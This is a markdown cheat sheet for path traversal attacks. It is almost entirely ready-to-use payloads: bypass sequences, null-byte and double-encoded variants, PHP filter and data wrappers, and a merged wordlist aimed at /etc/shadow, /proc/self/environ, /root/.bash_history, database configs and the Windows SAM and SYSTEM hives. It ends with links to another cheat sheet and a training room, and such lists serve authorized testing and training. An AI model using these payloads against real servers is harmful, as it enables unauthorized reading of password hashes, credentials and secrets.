# Path Traversal Cheat Sheet
1. [Common Paths to Read](#common-paths-to-read)
2. [Common Method](#common-method)
3. [Bypassing Defence Mechanism](#bypassing-defence-mechanism)
4. [File Extension with Null Byte Bypass](#file-extension-with-null-byte-bypass)
5. [Linux Path Traversal Payloads](#linux-path-traversal-payloads)
6. [Windows Path Traversal Payloads](#windows-path-traversal-payloads)
7. [URL Encoded Variants](#url-encoded-variants)
8. [Wordlist](#wordlist)
9. [External Cheat Sheet](#external-cheat-sheet)
10. [To Learn](#to-learn)
### Common Paths to read
```txt
/etc/passwd
/var/log/apache2/access.log
```
___
### Common Method
```txt
../../../etc/passwd >> For linux

..\..\..\windows\win.ini >> For windows
```
#### Bypassing Defence Mechanism
1. Sequence block bypass >> ....//....//....//....//etc/passwd
2. Sequence block bypass2 >> ..//..//..//..//etc/passwd
3. Encoding ../ >> %2e%2e%2f
4. Absolute path >> /var/www/images/../../../etc/passwd
5. Absolute path2 >> /var/www/html/..//..//..//etc/passwd
6. Using null byte >> ../../../etc/passwd%00.png
7. Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
8. Using Data wrappers >> data:text/plain,<?php%20phpinfo();%20?>

### File extension with null byte bypass
```Note:``` Don't forget to adjust the file with extension. Ex: ```/etc/passwd%00.png```
```
/etc/passwd%00
../../../etc/passwd%00
..//..//..//..//etc/passwd%00
....//....//....//....//etc/passwd%00
/var/www/images/../../../etc/passwd%00
/var/www/images/..//..//..//..//etc/passwd%00
/var/www/images/....//....//....//....//etc/passwd%00
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
..%252f..%252f..%252fetc/passwd%00
%2Fetc%2Fpasswd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd%00
```
If not work, try with `%2500` instead of `%00`. <br>
Poc: [Character bypass with Poison Null Byte](https://youtu.be/LSsjqnD0CYU?si=YuC-daGovlRzrlHX)

### Linux Path Traversal Payloads
```
/etc/passwd
../../../etc/passwd
../../../../../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc/passwd
%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd
/etc/passwd%00
../../../etc/passwd%00
..//..//..//..//etc/passwd%00
....//....//....//....//etc/passwd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
..%252f..%252f..%252fetc/passwd%00
%2Fetc%2Fpasswd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
../../../../etc/group
../../../../../../../../etc/passwd
../../../../../../../../etc/hosts
../../../../../../../../etc/shadow
../../../../../../../../proc/self/environ
../../../../../../../../var/mail/root
../../../../../../../../root/.bash_history
../../../../../../../../etc/apache2/apache2.conf
../../../../../../../../etc/mysql/my.cnf
../../../../../../../proc/version
../../../../../../../proc/cpuinfo
../../../../../../../proc/meminfo
../../../../../../../proc/self/cmdline
../../../../../../../proc/self/status
../../../../../../../proc/self/mounts
../../../../../../../proc/self/mountinfo
../../../../../../../proc/self/fd
../../../../../../../proc/self/environ
```
### Windows Path Traversal Payloads
```
..\..\..\windows\win.ini
..\..\..\..\..\..\windows\win.ini
%5C%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini
..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
%2e%2e%5c%2e%2e%5cwindows%5csystem.ini
..%255c..%255c..%255cwindows%255cwin.ini
../../../../../../../../boot.ini
../../../../../../../../windows/system32/config/system
../../../../../../../../windows/system32/config/software
../../../../../../../../windows/system32/config/sam
../../../../../../../../windows/repair/sam
../../../../../../../../windows/repair/system
../../../../../../../../windows/win.ini
../../../../../../../../windows/system.ini
/../../../../../../../../boot.ini
/../../../../../../../../windows/win.ini
/../../../../../../../../windows/system.ini
/../../../../../../../../windows/system32/config/system
/../../../../../../../../windows/system32/config/software
/../../../../../../../../windows/system32/config/sam
```
### URL Encoded Variants
```
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fshadow%00
%2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fshadow%00
```
### Wordlist
```txt
/etc/passwd
../../../etc/passwd
../../../../../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc/passwd
%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd
/etc/passwd%00
../../../etc/passwd%00
..//..//..//..//etc/passwd%00
....//....//....//....//etc/passwd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
..%252f..%252f..%252fetc/passwd%00
%2Fetc%2Fpasswd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
../../../../etc/group
../../../../../../../../etc/passwd
../../../../../../../../etc/hosts
../../../../../../../../etc/shadow
../../../../../../../../proc/self/environ
../../../../../../../../var/mail/root
../../../../../../../../root/.bash_history
../../../../../../../../etc/apache2/apache2.conf
../../../../../../../../etc/mysql/my.cnf
../../../../../../../proc/version
../../../../../../../proc/cpuinfo
../../../../../../../proc/meminfo
../../../../../../../proc/self/cmdline
../../../../../../../proc/self/status
../../../../../../../proc/self/mounts
../../../../../../../proc/self/mountinfo
../../../../../../../proc/self/fd
../../../../../../../proc/self/environ
..\..\..\windows\win.ini
..\..\..\..\..\..\windows\win.ini
%5C%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini
..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
%2e%2e%5c%2e%2e%5cwindows%5csystem.ini
..%255c..%255c..%255cwindows%255cwin.ini
../../../../../../../../boot.ini
../../../../../../../../windows/system32/config/system
../../../../../../../../windows/system32/config/software
../../../../../../../../windows/system32/config/sam
../../../../../../../../windows/repair/sam
../../../../../../../../windows/repair/system
../../../../../../../../windows/win.ini
../../../../../../../../windows/system.ini
/../../../../../../../../boot.ini
/../../../../../../../../windows/win.ini
/../../../../../../../../windows/system.ini
/../../../../../../../../windows/system32/config/system
/../../../../../../../../windows/system32/config/software
/../../../../../../../../windows/system32/config/sam
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fshadow%00
%2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fshadow%00
```
### External Cheat Sheet
https://github.com/JahTheTrueGod/Directory-Traversal-Cheat-Sheet
### To learn
https://tryhackme.com/r/room/filepathtraversal
